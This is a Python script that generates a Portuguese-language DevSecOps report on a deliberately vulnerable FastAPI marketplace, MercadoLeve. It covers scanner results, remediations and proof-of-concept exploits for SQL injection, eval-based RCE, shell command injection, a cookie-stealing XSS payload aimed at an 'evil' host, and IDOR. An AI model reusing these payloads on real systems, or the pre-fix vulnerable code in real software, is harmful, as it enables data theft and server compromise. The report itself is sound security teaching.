# -*- coding: utf-8 -*-
"""Conteúdo do relatório técnico DevSecOps (MercadoLeve)."""
from gerar_relatorio import (
    GREEN, ORANGE, RED, R, O, G, bullets, callout, code, cover_page, h1, h2, h3,
    p, pl, render, small, sp, story, table,
)
from reportlab.platypus import NextPageTemplate

cover_page()
story.append(NextPageTemplate("content"))

# ===========================================================================
# SUMÁRIO EXECUTIVO
# ===========================================================================
h1("Sumário Executivo")
p("Este relatório documenta o projeto, a implementação e a análise crítica de uma "
  "esteira completa de <b>DevSecOps</b> aplicada ao <b>MercadoLeve</b>, uma API de "
  "marketplace de autoria própria construída com FastAPI e PostgreSQL. A esteira foi "
  "implementada em <b>GitHub Actions</b> e contempla as cinco análises obrigatórias — "
  "Secret Detection, SCA, SAST, IaC Scanning e DAST — todas executadas com sucesso "
  "sobre o código, a infraestrutura e a aplicação em execução.")
p("Todas as ferramentas foram efetivamente executadas (localmente e descritas em CI), "
  "gerando artefatos reais em formato JSON/SARIF/HTML. Foram identificadas "
  "vulnerabilidades de impacto real — incluindo injeção de SQL, execução remota de "
  "código (RCE), injeção de comandos, XSS armazenado, quebra de controle de acesso "
  "(IDOR) e hashing de senha com MD5 — todas <b>exploradas em prova de conceito</b> e "
  "posteriormente <b>corrigidas e revalidadas</b>.")

h2("Quadro-resumo dos resultados (antes da correção)")
table([
    ["Etapa", "Ferramenta(s)", "Achados", "Reais (médio+)", "Falsos pos./ruído"],
    ["Secret Detection", "Gitleaks", "6", "6", "0 (+1 corretamente ignorado)"],
    ["SCA", "pip-audit / Trivy", "51 / 36", "≥ 30 (1 crítica)", "n/a (transitivos)"],
    ["SAST", "Semgrep / Bandit", "7 / 8", "6", "2 (Low)"],
    ["IaC Scanning", "Checkov / Trivy", "54 / 28", "≈ 18 (1 crítica)", "best-practices"],
    ["DAST", "OWASP ZAP", "13 alertas", "1 Alto + 2 Médios", "headers/ruído"],
], [3.4 * 28, 3.4 * 28, 2.3 * 28, 3.0 * 28, 4.7 * 28],
   font="TblS", align_left_cols=[0, 1])
small("Os valores “antes/depois” detalhados de cada ferramenta são apresentados na "
      "Seção 6. As contagens acima referem-se à versão vulnerável do sistema "
      "(commits anteriores à correção).")

callout("Resultado da remediação",
        "Após as correções, a injeção de SQL deixou de ser detectada pelo DAST "
        "(ZAP: <b>PASS</b>), os achados de SAST caíram de 15 para 5 (todos os "
        "remanescentes são falsos positivos justificados), as vulnerabilidades de "
        "dependências caíram de 51 para 18 (todas as residuais com CVE posterior ao "
        "baseline ou presas por compatibilidade), e os erros de IaC caíram de 54 para "
        "14 no Checkov e de 28 para 3 no Trivy.", color=GREEN)

# ===========================================================================
# 1. DESCRIÇÃO DO SISTEMA E FERRAMENTAL
# ===========================================================================
h1("1. Descrição do Sistema e Ferramental")

h2("1.1 Contexto de uso e lógica de negócio")
p("O <b>MercadoLeve</b> é uma API de marketplace que conecta vendedores e compradores. "
  "Ela suporta o ciclo de compra completo e concentra dados sensíveis (credenciais, "
  "endereços, dados de pagamento), o que lhe confere uma superfície de ataque "
  "relevante. As funcionalidades de negócio implementadas são:")
bullets([
    "<b>Identidade e acesso:</b> cadastro de usuários/vendedores, login com emissão de "
    "token JWT, e um nível administrativo com privilégios elevados.",
    "<b>Catálogo:</b> cadastro de produtos por vendedores, listagem, e <b>busca</b> "
    "textual com ordenação dinâmica.",
    "<b>Compra:</b> carrinho de compras, <b>checkout</b> com cálculo de total e "
    "notificação a um gateway de pagamento, e consulta de pedidos.",
    "<b>Conteúdo de usuário:</b> avaliações (reviews) de produtos e uma vitrine HTML "
    "pública que renderiza essas avaliações.",
    "<b>Administração:</b> listagem de usuários, <i>backup</i> de tabelas, importação "
    "de catálogo via YAML e aplicação de regras dinâmicas de precificação.",
])

h2("1.2 Stack tecnológico")
table([
    ["Camada", "Tecnologia"],
    ["Linguagem", "Python 3.12"],
    ["Framework web/API", "FastAPI 0.115 (Starlette / Uvicorn ASGI)"],
    ["ORM / Banco de dados", "SQLAlchemy 2.0 + PostgreSQL 15"],
    ["Autenticação", "JWT (python-jose) + hashing de senha (bcrypt via passlib)"],
    ["Templates / vitrine", "Jinja2"],
    ["Conteinerização", "Docker + docker-compose"],
    ["IaC — nuvem", "Terraform (AWS: S3, RDS, EC2, Security Groups)"],
    ["IaC — orquestração", "Kubernetes (Deployment, Service, NetworkPolicy)"],
    ["CI/CD", "GitHub Actions"],
], [4.2 * 28, 12.5 * 28], align_left_cols=[0, 1])
small("Repositório (preencher com a URL após o push): "
      "https://github.com/&lt;usuario&gt;/mercadoleve — a esteira encontra-se em "
      ".github/workflows/devsecops.yml.")

h2("1.3 Arquitetura")
code(
"                          GitHub (push / pull_request)\n"
"                                    |\n"
"                                    v\n"
"           +------------------ GitHub Actions: DevSecOps Pipeline ------------------+\n"
"           |                                                                         |\n"
"   [1] Secret Detection   [2] SCA            [3] SAST          [4] IaC Scan          |\n"
"       Gitleaks           pip-audit+Trivy    Semgrep+Bandit    Checkov+Trivy         |\n"
"       (git history)      (requirements)     (app/)            (Docker/TF/K8s)       |\n"
"           |                  |                 |                  |                 |\n"
"           +------------------+--------+--------+------------------+                 |\n"
"                                       v (needs: sast, sca)                          |\n"
"                            [5] DAST  -  docker compose up  +  OWASP ZAP             |\n"
"                                       (API em execução, scan via OpenAPI)           |\n"
"           +-------------------------------------------------------------------------+\n"
"                                       v\n"
"                       Relatórios SARIF -> aba Security (Code Scanning)\n",
title="Figura 1 — Topologia do pipeline DevSecOps no GitHub Actions")

p("Em tempo de aplicação, o cliente HTTP fala com a API FastAPI (Uvicorn), que "
  "persiste no PostgreSQL via SQLAlchemy, renderiza a vitrine com Jinja2 e chama um "
  "gateway de pagamento externo no checkout. Em produção, o artefato é uma imagem "
  "Docker executada em EC2/Kubernetes, com armazenamento de imagens em um bucket S3.")

h2("1.4 Ferramental por etapa de análise")
table([
    ["Etapa", "Ferramenta", "Papel"],
    ["Secret Detection", "Gitleaks 8.30", "Varre todo o histórico de commits por "
     "segredos (regex + entropia)."],
    ["SCA", "pip-audit 2.10 + Trivy 0.5x", "Vulnerabilidades conhecidas (CVE/GHSA) "
     "nas dependências de requirements.txt."],
    ["SAST", "Semgrep 1.16 + Bandit 1.9", "Padrões inseguros no código-fonte Python "
     "(rulesets p/python e p/security-audit)."],
    ["IaC Scanning", "Checkov 3.3 + Trivy config", "Conformidade de Dockerfile, "
     "docker-compose, Terraform e Kubernetes."],
    ["DAST", "OWASP ZAP (stable)", "Teste dinâmico ativo da API em execução, "
     "importando a especificação OpenAPI."],
], [2.9 * 28, 3.5 * 28, 10.4 * 28], font="TblS", align_left_cols=[0, 1, 2])
p("Em todas as etapas adotou-se a estratégia de <b>duas ferramentas complementares</b> "
  "(exceto DAST), reduzindo pontos cegos: por exemplo, o Bandit é forte em padrões "
  "Python específicos (MD5, <i>shell=True</i>) e o Semgrep traz regras semânticas mais "
  "amplas; Checkov tem catálogo extenso de políticas AWS e o Trivy classifica melhor a "
  "severidade.")

# ===========================================================================
# 2. METODOLOGIA / PIPELINE
# ===========================================================================
h1("2. Metodologia e Configuração da Esteira")
p("A esteira é disparada em <i>push</i> e <i>pull_request</i> sobre os ramos "
  "principais. Cada análise é um <i>job</i> independente; o DAST depende dos jobs de "
  "SAST e SCA (<i>needs</i>) e sobe a aplicação com <i>docker compose</i> antes de "
  "atacá-la. Os resultados são publicados como SARIF na aba <i>Security</i> do GitHub.")
code(
"jobs:\n"
"  secret-detection:    # Gitleaks (fetch-depth: 0 -> histórico completo)\n"
"  sca:                 # pip-audit + Trivy fs  -> trivy-sca.sarif\n"
"  sast:                # Semgrep (p/python, p/security-audit) + Bandit -> semgrep.sarif\n"
"  iac-scan:            # Checkov + Trivy config -> checkov.sarif / trivy-iac.sarif\n"
"  dast:                # needs:[sast, sca]; docker compose up + OWASP ZAP\n",
title="Trecho de .github/workflows/devsecops.yml (estrutura dos jobs)")
p("O workflow completo encontra-se no <b>Apêndice A</b>. A seguir, as evidências de "
  "execução real de cada etapa, seguidas da análise crítica.")

# ===========================================================================
# 3. EVIDÊNCIAS DE EXECUÇÃO
# ===========================================================================
h1("3. Evidências de Execução")
p("As saídas abaixo foram capturadas da execução real das ferramentas sobre o "
  "repositório do MercadoLeve. Os artefatos completos (JSON/SARIF/HTML) ficam no "
  "diretório <i>security-reports/</i>.")

# ---- 3.1 Secret ----
h2("3.1 Secret Detection — Gitleaks")
code(
"$ gitleaks detect --source . --report-format json -v\n"
"Finding:   STRIPE_API_KEY=REDACTED        RuleID: stripe-access-token\n"
"  File: .env  Line: 3   Commit: d145abb  Author: Pedro Fontoura\n"
"Finding:   github-pat REDACTED            RuleID: github-pat\n"
"  File: .env  Line: 6   Commit: d145abb\n"
"Finding:   STRIPE_API_KEY ... REDACTED    RuleID: stripe-access-token\n"
"  File: app/config.py Line: 24  Commit: d145abb\n"
"Finding:   STRIPE_API_KEY: REDACTED       File: docker-compose.yml Line: 20\n"
"Finding:   STRIPE_API_KEY REDACTED        File: infra/k8s/deployment.yaml Line: 34\n"
"Finding:   password = \"REDACTED\"          RuleID: hashicorp-tf-password\n"
"  File: infra/terraform/main.tf Line: 32\n"
"6:18PM INF 6 commits scanned.\n"
"WRN leaks found: 6\n",
title="Saída — Gitleaks (6 segredos em 6 commits varridos)")
p("O Gitleaks detectou 6 segredos: 4 tokens Stripe, 1 <i>GitHub Personal Access "
  "Token</i> e 1 senha de banco no Terraform. Crucialmente, encontrou o segredo "
  "mesmo no <b>.env já removido</b> do versionamento, provando o valor de varrer o "
  "histórico — o arquivo persiste nos commits d145abb…9a2c73e.")

# ---- 3.2 SCA ----
h2("3.2 SCA — pip-audit e Trivy")
code(
"$ pip-audit -r requirements.txt\n"
"Found 51 known vulnerabilities in 9 packages\n"
"Name             Version   ID                  Fix Versions\n"
"jinja2           3.1.2     CVE-2024-22195      3.1.3\n"
"requests         2.31.0    CVE-2024-35195      2.32.0\n"
"cryptography     41.0.7    CVE-2023-50782      42.0.0\n"
"python-jose      3.3.0     PYSEC-2024-232 / 233\n"
"python-multipart 0.0.6     CVE-2024-53981      0.0.18\n"
"urllib3          2.0.6     CVE-2024-37891      2.2.2\n"
"certifi          2022.12.7 PYSEC-2023-135      2023.7.22\n"
"starlette        0.27.0    CVE-2024-47874      0.40.0\n"
"... (51 no total)\n"
"\n"
"$ trivy fs --scanners vuln .\n"
"requirements.txt: 36 vulnerabilidades (1 CRITICAL, 17 HIGH, 18 MEDIUM)\n"
"  CRITICAL  python-jose 3.3.0  CVE-2024-33663  algorithm confusion (ECDSA)\n",
title="Saída — pip-audit (51) e Trivy (36); destaque para a CVE crítica do python-jose")

# ---- 3.3 SAST ----
h2("3.3 SAST — Bandit e Semgrep")
code(
"$ bandit -r app/\n"
">> B324 hashlib  Use of weak MD5 hash for security      [High]   app/auth.py:19\n"
">> B602 subprocess_popen_with_shell_equals_true          [High]   app/routers/admin.py:27\n"
">> B501 request_with_no_cert_validation (verify=False)   [High]   app/routers/orders.py:52\n"
">> B506 yaml_load  Use of unsafe yaml load               [Medium] app/routers/admin.py:38\n"
">> B307 eval  Use of possibly insecure function          [Medium] app/routers/admin.py:59\n"
">> B608 hardcoded_sql_expressions (SQL injection)        [Medium] app/routers/products.py:27\n"
">> B404 import subprocess / B110 try-except-pass         [Low]    (2 itens)\n"
"Total issues: 8  (High: 3, Medium: 3, Low: 2)\n"
"\n"
"$ semgrep --config=p/python --config=p/security-audit app/\n"
"Ran 200 rules on 14 files: 7 findings.\n"
"  insecure-hash-algorithm-md5 / md5-used-as-password     app/auth.py:19\n"
"  subprocess-shell-true                                  app/routers/admin.py:27\n"
"  avoid-pyyaml-load                                      app/routers/admin.py:38\n"
"  eval-detected                                          app/routers/admin.py:59\n"
"  disabled-cert-validation                               app/routers/orders.py:49\n"
"  avoid-sqlalchemy-text                                  app/routers/products.py:32\n",
title="Saída — Bandit (8) e Semgrep (7); achados convergentes")

# ---- 3.4 IaC ----
h2("3.4 IaC Scanning — Checkov e Trivy config")
code(
"$ checkov -d . --framework dockerfile terraform kubernetes\n"
"[terraform]  passed=18  failed=27\n"
"[kubernetes] passed=67  failed=23\n"
"[dockerfile] passed=27  failed=4\n"
"  CKV_AWS_20  aws_s3_bucket.uploads  -> S3 ACL permite leitura pública\n"
"  CKV_AWS_17  aws_db_instance.main   -> RDS publicamente acessível\n"
"  CKV_AWS_16  aws_db_instance.main   -> RDS sem criptografia em repouso\n"
"  CKV_AWS_24  aws_security_group.api -> ingress 0.0.0.0/0 na porta 22 (SSH)\n"
"  CKV_K8S_16  Deployment             -> container privilegiado\n"
"  CKV_K8S_39  Deployment             -> capability CAP_SYS_ADMIN\n"
"  CKV_DOCKER_3 Dockerfile            -> container roda como root\n"
"  CKV_DOCKER_7 Dockerfile            -> imagem base com tag 'latest'\n"
"  ... (54 falhas no total)\n"
"\n"
"$ trivy config .\n"
"28 misconfigurações (1 CRITICAL, 16 HIGH, 11 MEDIUM)\n"
"  HIGH AWS-0107 SSH aberto p/ 0.0.0.0/0 | AWS-0180 RDS público | KSV-0017 Privileged\n",
title="Saída — Checkov (54 falhas) e Trivy config (28 misconfigs)")

# ---- 3.5 DAST ----
h2("3.5 DAST — OWASP ZAP")
p("O ZAP foi executado de duas formas: <i>baseline</i> (passivo, sobre a raiz) e, "
  "principalmente, <i>API scan ativo</i> importando a especificação OpenAPI "
  "(<i>/openapi.json</i>, 18 <i>endpoints</i>), que exercita ataques reais contra cada rota.")
code(
"$ docker run ... zaproxy/zaproxy zap-api-scan.py -t .../openapi.json -f openapi\n"
"WARN-NEW: SQL Injection [40018] x 2\n"
"   http://app:8000/products/search?q=%27&order=name      (500 Internal Server Error)\n"
"   http://app:8000/products/search?q=q&order=%27         (500 Internal Server Error)\n"
"   -> classificado como 'SQL Injection - PostgreSQL' (Risk: High)\n"
"WARN-NEW: Content Security Policy (CSP) Header Not Set [10038]\n"
"WARN-NEW: Missing Anti-clickjacking Header [10020]\n"
"WARN-NEW: X-Content-Type-Options Header Missing [10021] x 7\n"
"WARN-NEW: A Server Error response code was returned by the server [100000]\n"
"FAIL-NEW: 0   WARN-NEW: 8   PASS: 113\n",
title="Saída — OWASP ZAP API scan (injeção de SQL confirmada dinamicamente)")
p("O ZAP confirmou <b>dinamicamente</b> a injeção de SQL em <i>/products/search</i> "
  "(tanto no parâmetro <i>q</i> quanto em <i>order</i>), além de cabeçalhos de "
  "segurança ausentes e vazamento de erros. Essa confirmação por uma ferramenta "
  "<i>black-box</i>, independente do SAST, eleva muito a confiança de que o achado é real.")

callout("Prova de exploração (PoC) das falhas reais",
        "Para validar o impacto além das ferramentas, cada falha de médio+ risco foi "
        "explorada manualmente contra a aplicação em execução. As evidências dessas "
        "explorações estão na Seção 5.", )

# ===========================================================================
# 4. FALSOS POSITIVOS
# ===========================================================================
h1("4. Análise de Falsos Positivos e Alertas Irrelevantes")
p("Ferramentas automatizadas geram ruído. Distinguir o que é risco real do que é "
  "irrelevante no contexto do MercadoLeve é parte central da análise. Abaixo, os "
  "principais casos de falso positivo / baixa relevância, com a justificativa técnica.")

h3("4.1 Gitleaks — chave AWS de exemplo corretamente ignorada")
p("O código contém " + O("AKIAIOSFODNN7EXAMPLE") + " e a <i>secret key</i> "
  "<i>wJalrXUtnFEMI/...EXAMPLEKEY</i>. À primeira vista pareceriam credenciais "
  "vazadas, mas o Gitleaks <b>não</b> as reportou — corretamente. Trata-se da chave de "
  "exemplo da documentação oficial da AWS, presente na <i>allowlist</i> da ferramenta. "
  "É um verdadeiro-negativo desejável: marcá-las geraria ruído. <b>Lição:</b> nem todo "
  "padrão de credencial é um segredo; o contexto importa.")

h3("4.2 SAST pós-correção — B608 e avoid-sqlalchemy-text (falsos positivos)")
p("Após a correção da busca, o Bandit ainda acusa " + O("B608 (hardcoded SQL)") +
  " e o Semgrep ainda acusa " + O("avoid-sqlalchemy-text") + " em "
  "<i>products.py</i>. Esses alertas são <b>falsos positivos</b>: a consulta passou a "
  "usar <i>bind parameters</i> (<i>:pattern</i>) para o dado do usuário, e a única "
  "interpolação remanescente é o nome da coluna de ordenação, <b>validado contra uma "
  "lista de permissão</b> (<i>ALLOWED_ORDER</i>). As ferramentas detectam o padrão "
  "sintático <i>f-string + text()</i> mas não conseguem provar que o valor é seguro. "
  "Mantemos o código como está, pois a mitigação (whitelist) é a recomendada.")

h3("4.3 SAST — B404 e B110 (informativos de baixa relevância)")
p("O Bandit emite " + O("B404 (import subprocess)") + " e " + O("B110 (try/except/"
  "pass)") + ". O B404 é meramente informativo (importar <i>subprocess</i> não é "
  "vulnerabilidade); o que importa é <i>como</i> se usa — tratado em 5.3. O B110 "
  "apontava um <i>except</i> silencioso no checkout; foi melhorado para registrar "
  "log, mas nunca representou risco de segurança explorável.")

h3("4.4 SCA — vulnerabilidades residuais sem correção aplicável")
p("Após atualizar as dependências, restaram 18 alertas. A análise mostra que "
  "<b>nenhum</b> é negligência: são CVEs com identificador <i>2025/2026</i> "
  "divulgados <b>após</b> o baseline de versões corrigidas, ou presos por "
  "compatibilidade transitiva — por exemplo, o <i>starlette</i> não pode ser elevado "
  "à série 1.x sem quebrar o FastAPI 0.115, e o <i>pyasn1</i> é fixado em &lt;0.5 pelo "
  "<i>python-jose</i>. São <b>riscos aceitos e rastreados</b> para a próxima janela de "
  "manutenção, não falhas ativas exploráveis no contexto atual.")

h3("4.5 IaC — boas práticas de defesa em profundidade (baixa prioridade)")
p("Parte dos achados de IaC não são vulnerabilidades, e sim recomendações de "
  "robustez operacional: " + O("Performance Insights") + ", " + O("Enhanced "
  "Monitoring") + ", " + O("cross-region replication do S3") + ", " + O("uso de "
  "digest de imagem") + " e " + O("imagePullPolicy: Always") + ". Não ampliam a "
  "superfície de ataque do MercadoLeve e foram classificados como melhorias futuras.")
p("Um caso instrutivo é o " + O("AWS-0104 (egress 0.0.0.0/0)") + ", marcado como "
  "<b>CRITICAL</b> pelo Trivy mesmo após a correção: nós deliberadamente permitimos "
  "saída HTTPS (443) para qualquer destino, pois a API precisa falar com o gateway de "
  "pagamento e o S3. Bloquear todo egress quebraria o negócio; é um <b>risco aceito "
  "conscientemente</b>, ilustrando que severidade da ferramenta ≠ risco no contexto.")

h3("4.6 DAST — ruído de cabeçalhos e respostas de erro")
p("O ZAP lista vários alertas <i>Low/Informational</i>: " + O("Storable and "
  "Cacheable Content") + " em respostas de API (irrelevante para JSON dinâmico), " +
  O("Unexpected Content-Type") + " na vitrine HTML (que é, de fato, HTML — esperado), "
  "e dezenas de " + O("Client Error (4xx)") + " nos <i>endpoints</i> que exigem "
  "autenticação (o scanner não estava autenticado). São esperados e não indicam falha.")
callout("Limitação metodológica do DAST (importante)",
        "O ZAP rodou <b>sem autenticação</b>. Por isso não exercitou as rotas de "
        "/admin (RCE via eval e injeção de comando) nem o XSS armazenado, que exigem "
        "sessão válida. Isso explica por que o DAST não os encontrou e reforça a "
        "<b>complementaridade SAST × DAST</b>: o SAST viu o código dessas rotas; o "
        "DAST confirmou a SQLi não autenticada. Nenhuma ferramenta isolada é suficiente.",
        color=ORANGE)

# ===========================================================================
# 5. FALHAS REAIS E CORREÇÃO
# ===========================================================================
h1("5. Identificação e Correção de Falhas Reais")
p("Esta seção detalha as vulnerabilidades de <b>médio ou maior risco</b> confirmadas "
  "como reais. Para cada uma: a falha apontada pela ferramenta, o impacto no "
  "MercadoLeve, a <b>prova de exploração</b> e a correção aplicada (com verificação).")

table([
    ["#", "Vulnerabilidade", "CWE", "Risco", "Detectada por", "Status"],
    ["1", "Injeção de SQL na busca", "CWE-89", "Crítico", "Bandit, Semgrep, ZAP", "Corrigida"],
    ["2", "RCE via eval() em regra de preço", "CWE-95", "Crítico", "Bandit, Semgrep", "Corrigida"],
    ["3", "Injeção de comando no backup", "CWE-78", "Crítico", "Bandit, Semgrep", "Corrigida"],
    ["4", "Hashing de senha com MD5", "CWE-327", "Alto", "Bandit, Semgrep", "Corrigida"],
    ["5", "XSS armazenado na vitrine", "CWE-79", "Alto", "Revisão (autoescape)", "Corrigida"],
    ["6", "IDOR em pedidos/carrinho", "CWE-639", "Alto", "Revisão / PoC", "Corrigida"],
    ["7", "TLS desabilitado (verify=False)", "CWE-295", "Médio", "Bandit, Semgrep", "Corrigida"],
    ["8", "Segredos hardcoded / no git", "CWE-798", "Alto", "Gitleaks", "Corrigida"],
    ["9", "Dep. crítica python-jose", "CWE-1395", "Crítico", "Trivy, pip-audit", "Corrigida"],
    ["10", "IaC: container privilegiado", "CWE-250", "Alto", "Checkov, Trivy", "Corrigida"],
    ["11", "IaC: S3 público / RDS exposto", "CWE-732", "Alto", "Checkov, Trivy", "Corrigida"],
    ["12", "CORS '*' + credenciais / DEBUG", "CWE-942", "Médio", "Revisão / ZAP", "Corrigida"],
], [0.8 * 28, 5.0 * 28, 1.9 * 28, 1.9 * 28, 4.0 * 28, 2.1 * 28],
   font="TblS", align_left_cols=[1, 4])

# ---- Falha 1 ----
h2("5.1 Injeção de SQL na busca de produtos " + R("(Crítico, CWE-89)"))
p("<b>Falha:</b> o <i>endpoint</i> <i>/products/search</i> montava a consulta "
  "concatenando os parâmetros <i>q</i> e <i>order</i> via <i>f-string</i>. "
  "<b>Impacto:</b> exfiltração de qualquer dado do banco. A PoC abaixo extrai e-mails "
  "e hashes de senha de todos os usuários via <i>UNION</i>:")
code(
"# ANTES (vulnerável) — app/routers/products.py\n"
"sql = (\"SELECT id, name, description, price, stock FROM products \"\n"
"       f\"WHERE name ILIKE '%{q}%' OR description ILIKE '%{q}%' ORDER BY {order}\")\n"
"rows = db.execute(text(sql)).fetchall()\n"
"\n"
"# PoC (exploração real):\n"
"$ curl --get .../products/search --data-urlencode \\\n"
"   \"q=' UNION SELECT id, email, password_hash, 0.0, 0 FROM users--\"\n"
"[ ... ,\n"
"  {\"name\": \"admin@mercadoleve.local\", \"description\": \"0192023a7bbd73250516f069df18b500\"},\n"
"  {\"name\": \"vendedor@mercadoleve.local\", \"description\": \"e7d80ffeefa212b7c5c55700e4f7193e\"} ]\n"
"# o hash 0192023a... é md5('admin123') — trivialmente quebrável (ver Falha 4)\n",
title="Exploração — vazamento de credenciais via UNION-based SQL injection")
code(
"# DEPOIS (corrigido)\n"
"ALLOWED_ORDER = {\"name\", \"price\", \"stock\", \"id\"}        # lista de permissão\n"
"if order not in ALLOWED_ORDER: order = \"name\"\n"
"sql = text(\"SELECT ... FROM products \"\n"
"           \"WHERE name ILIKE :pattern OR description ILIKE :pattern \"\n"
"           f\"ORDER BY {order}\")                            # order já validado\n"
"rows = db.execute(sql, {\"pattern\": f\"%{q}%\"}).fetchall()   # bind parameter\n",
title="Correção — parâmetro vinculado + whitelist de ordenação")
p("<b>Verificação:</b> após a correção, a mesma PoC retorna 0 linhas (sem vazamento) "
  "e o ZAP reclassifica a regra 40018 como " + G("PASS") + ".")

# ---- Falha 2 ----
h2("5.2 RCE via eval() na regra de precificação " + R("(Crítico, CWE-95)"))
p("<b>Falha:</b> <i>/admin/pricing-rule</i> avaliava com <i>eval()</i> uma expressão "
  "enviada pelo cliente. Como <i>eval</i> recebe acesso implícito a <i>__builtins__</i>, "
  "obtém-se execução arbitrária de código no servidor. <b>Impacto:</b> comprometimento "
  "total do host da aplicação.")
code(
"# ANTES:  final_price = eval(expression, {\"price\": price})\n"
"# PoC:\n"
"$ curl -X POST .../admin/pricing-rule -H \"Authorization: Bearer <admin>\" \\\n"
"   -d '{\"expression\":\"__import__(\\\"os\\\").popen(\\\"id && uname -a\\\").read()\",\"base_price\":100}'\n"
"{\"final_price\": \"uid=501(fontoura) gid=20(staff) ... Darwin ... arm64\"}   # RCE!\n"
"\n"
"# DEPOIS: avaliador aritmético seguro baseado em AST (sem eval)\n"
"_OPS = {ast.Add: operator.add, ast.Sub: ..., ast.Mult: ..., ast.Div: ...}\n"
"def _safe_arith(node, price):   # aceita só números, a variável 'price' e + - * /\n"
"    ...                          # qualquer outro nó -> ValueError\n"
"# + validação por regex e tratamento de erro -> HTTP 400\n",
title="Exploração e correção — eval() substituído por avaliador AST restrito")
p("<b>Verificação:</b> a PoC passou a retornar " + G("HTTP 400") + "; a regra legítima "
  "<i>price*0.9</i> continua funcionando (retorna 90.0).")

# ---- Falha 3 ----
h2("5.3 Injeção de comando no backup " + R("(Crítico, CWE-78)"))
p("<b>Falha:</b> <i>/admin/backup</i> executava <i>subprocess.run(cmd, shell=True)</i> "
  "interpolando o nome da tabela. <b>Impacto:</b> execução de comandos arbitrários no "
  "contêiner.")
code(
"# ANTES:  cmd = f\"pg_dump -t {table} mercadoleve > /backups/{table}.sql\"\n"
"#         subprocess.run(cmd, shell=True)\n"
"# PoC:    {\"table\": \"users; echo PWNED_$(whoami) > /tmp/ml_pwned.txt; echo done\"}\n"
"$ cat /tmp/ml_pwned.txt  ->  PWNED_fontoura     # comando injetado executou\n"
"\n"
"# DEPOIS:\n"
"if table not in ALLOWED_TABLES: raise HTTPException(400)         # whitelist\n"
"subprocess.run([\"pg_dump\", \"-t\", table, \"-f\", f\"/backups/{table}.sql\",\n"
"                \"mercadoleve\"], capture_output=True)            # sem shell=True\n",
title="Exploração e correção — argumentos como lista + whitelist (sem shell)")
p("<b>Verificação:</b> entrada maliciosa passou a retornar " + G("HTTP 400") + " e "
  "nenhum metacaractere é mais interpretado pelo shell.")

# ---- Falha 4 ----
h2("5.4 Hashing de senha com MD5 " + O("(Alto, CWE-327)"))
p("<b>Falha:</b> senhas eram armazenadas como <i>MD5(senha)</i> — rápido e sem "
  "<i>salt</i>. Combinado com a Falha 1, o atacante exfiltra os hashes e os quebra "
  "instantaneamente (MD5 de senhas comuns está em qualquer <i>rainbow table</i>). "
  "<b>Correção:</b> migração para <b>bcrypt</b> (adaptativo, com salt) via passlib.")
code(
"# ANTES:  return hashlib.md5(password.encode()).hexdigest()\n"
"# DEPOIS: pwd_context = CryptContext(schemes=[\"bcrypt\"], deprecated=\"auto\")\n"
"#         return pwd_context.hash(password)        # $2b$... com salt por usuário\n",
title="Correção — MD5 substituído por bcrypt")

# ---- Falha 5 ----
h2("5.5 XSS armazenado na vitrine de avaliações " + O("(Alto, CWE-79)"))
p("<b>Falha:</b> a vitrine HTML renderizava avaliações com <i>Jinja2 Template(..., "
  "autoescape=False)</i>. Um comentário com <i>&lt;script&gt;</i> executa no navegador "
  "de qualquer visitante. <b>Impacto:</b> roubo de sessão/cookies, ações em nome da "
  "vítima.")
code(
"# PoC: review com comment = <script>document.location='https://evil/?c='+document.cookie</script>\n"
"# ANTES (página renderizada):  <li>5/5 - <script>...</script></li>      # executa!\n"
"# DEPOIS (autoescape=True):     <li>5/5 - &lt;script&gt;...&lt;/script&gt;</li>  # inerte\n",
title="Exploração e correção — autoescape habilitado")

# ---- Falha 6 ----
h2("5.6 Quebra de controle de acesso / IDOR " + O("(Alto, CWE-639)"))
p("<b>Falha:</b> <i>GET /orders/{id}</i> e <i>DELETE /cart/item/{id}</i> não "
  "verificavam a propriedade do recurso. <b>Impacto:</b> qualquer usuário lê pedidos "
  "alheios (endereço de entrega, valores) e manipula carrinhos de terceiros.")
code(
"# PoC: usuário 'atacante' lê o pedido 1 (do admin):\n"
"$ curl .../orders/1 -H \"Authorization: Bearer <atacante>\"\n"
"{\"order_id\":1,\"user_id\":1,\"shipping_address\":\"Rua do Admin, 100 - confidencial\"}\n"
"\n"
"# DEPOIS: checagem de propriedade\n"
"if order.user_id != user.id and not user.is_admin:\n"
"    raise HTTPException(403, \"Acesso negado a este pedido\")\n",
title="Exploração e correção — verificação de propriedade do recurso")
p("<b>Verificação:</b> o acesso cruzado passou a retornar " + G("HTTP 403") + ".")

# ---- Falhas 7-12 condensadas ----
h2("5.7 Demais falhas corrigidas")
h3("TLS desabilitado — verify=False " + O("(Médio, CWE-295)"))
p("O checkout chamava o gateway com <i>requests.post(..., verify=False)</i>, abrindo "
  "espaço para <i>man-in-the-middle</i> e vazamento da chave Stripe. Removeu-se o "
  "parâmetro (validação de certificado volta a ser padrão) e o <i>except</i> silencioso "
  "passou a registrar log.")
h3("Segredos no código e no histórico " + O("(Alto, CWE-798)"))
p("Chaves Stripe, <i>GitHub PAT</i> e senha do Terraform estavam <i>hardcoded</i> e o "
  "<i>.env</i> foi commitado. Correção: remoção do <i>.env</i> do versionamento, "
  "<i>.gitignore</i> apropriado, leitura obrigatória via variáveis de ambiente "
  "(sem <i>fallback</i> inseguro) e o próprio Gitleaks no CI como <b>gate</b> que "
  "barra novos vazamentos. <b>Observação importante:</b> como os segredos já entraram "
  "no histórico, a remediação completa exige <b>rotacionar todas as credenciais</b> e "
  "reescrever o histórico (<i>git filter-repo</i>) — remover o arquivo não basta.")
h3("Dependência crítica — python-jose " + R("(Crítico, CWE-1395)"))
p("A <i>CVE-2024-33663</i> (confusão de algoritmo) permitiria forjar JWTs. Atualizada "
  "para 3.4.0; o conjunto de dependências foi elevado para versões corrigidas "
  "(jinja2, requests, cryptography, urllib3, certifi, python-multipart, starlette).")
h3("IaC — privilégios e exposição " + O("(Alto, CWE-250/732)"))
bullets([
    "<b>Dockerfile:</b> passou a usar tag fixa (<i>python:3.12-slim</i>), usuário "
    "não-root (UID 10001), <i>COPY</i> seletivo (em vez de <i>ADD .</i>) e HEALTHCHECK.",
    "<b>Terraform:</b> S3 com <i>public access block</i> + criptografia + versionamento; "
    "RDS privado, cifrado, multi-AZ e com proteção contra exclusão; Security Group sem "
    "SSH aberto a 0.0.0.0/0; EC2 com IMDSv2 e EBS cifrado.",
    "<b>Kubernetes:</b> removidos <i>privileged</i> e <i>CAP_SYS_ADMIN</i>; "
    "<i>runAsNonRoot</i>, <i>readOnlyRootFilesystem</i>, <i>drop ALL</i> capabilities, "
